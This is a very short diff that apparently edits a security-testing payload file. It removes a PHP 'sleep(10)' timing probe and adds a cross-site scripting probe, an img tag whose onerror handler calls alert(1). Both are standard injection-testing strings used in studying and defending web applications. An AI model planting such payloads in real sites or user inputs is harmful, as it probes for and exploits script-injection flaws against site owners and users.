@@ -1,3 +1,1 @@
-<?php
-sleep(10);
-?>
+<img src = x onerror=alert(1)
